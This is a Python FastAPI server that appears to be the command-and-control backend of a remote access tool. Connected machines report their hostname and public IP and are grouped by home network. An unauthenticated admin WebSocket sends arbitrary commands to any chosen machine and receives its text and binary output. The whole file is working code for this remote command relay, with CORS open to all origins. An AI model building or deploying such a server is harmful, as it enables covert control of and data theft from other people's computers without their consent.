from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import time
import json
import os
import asyncio
import logging

logging.basicConfig(level=logging.INFO)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
client_infos = {}
last_seen = {}
hostname_map = {}
public_ip_map = {}
admin_ws = None

async def ping_clients():
    while True:
        for cid, ws in list(clients.items()):
            try:
                await ws.send_text("ping")
            except:
                remove_client(cid)
        await asyncio.sleep(10)

@app.on_event("startup")
async def startup():
    asyncio.create_task(ping_clients())

@app.get("/clients")
async def get_clients():
    networks = {}
    now = time.time()
    for hostname, cid in hostname_map.items():
        info = client_infos.get(cid, {})
        public_ip = info.get("public_ip", "Unknown Network")
        net_title = f"Home Network {public_ip}"
        if net_title not in networks:
            networks[net_title] = []
        status = "Online" if now - last_seen.get(cid, 0) < 20 else "Offline"
        networks[net_title].append({
            "id": cid,
            "hostname": hostname,
            "status": status,
            "info": info
        })
    return networks

@app.post("/logerror")
async def log_error(req: Request):
    data = await req.json()
    logging.error(f"Client Error Report: {json.dumps(data)}")
    return {"status": "logged"}

@app.websocket("/ws/client/{client_id}")
async def ws_client(ws: WebSocket, client_id: str):
    await ws.accept()
    sysinfo = None
    try:
        while True:
            data = await ws.receive_text()
            msg = json.loads(data)
            if msg.get("type") == "client_info":
                sysinfo = msg.get("data", {})
                break
    except:
        return

    hostname = sysinfo.get("hostname", client_id)
    public_ip = sysinfo.get("public_ip", "unknown")

    # replace old
    old_id = hostname_map.get(hostname)
    if old_id and old_id != client_id:
        try:
            await clients[old_id].close()
        except:
            pass
        remove_client(old_id)

    clients[client_id] = ws
    client_infos[client_id] = sysinfo
    hostname_map[hostname] = client_id
    public_ip_map[client_id] = public_ip
    last_seen[client_id] = time.time()

    try:
        while True:
            msg = await ws.receive()
            last_seen[client_id] = time.time()
            if "text" in msg and msg["text"] != "pong":
                if admin_ws:
                    await admin_ws.send_text(f"[{client_id}] {msg['text']}")
            elif "bytes" in msg:
                if admin_ws:
                    await admin_ws.send_bytes(msg["bytes"])
    except WebSocketDisconnect:
        remove_client(client_id)

@app.websocket("/ws/admin")
async def ws_admin(ws: WebSocket):
    global admin_ws
    await ws.accept()
    admin_ws = ws
    try:
        while True:
            msg = await ws.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                await clients[target].send_text(cmd)
    except:
        admin_ws = None

@app.get("/")
async def root():
    with open("static/index.html") as f:
        return HTMLResponse(f.read())

def remove_client(cid):
    clients.pop(cid, None)
    client_infos.pop(cid, None)
    last_seen.pop(cid, None)
    public_ip_map.pop(cid, None)
    for host, id_ in list(hostname_map.items()):
        if id_ == cid:
            hostname_map.pop(host)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
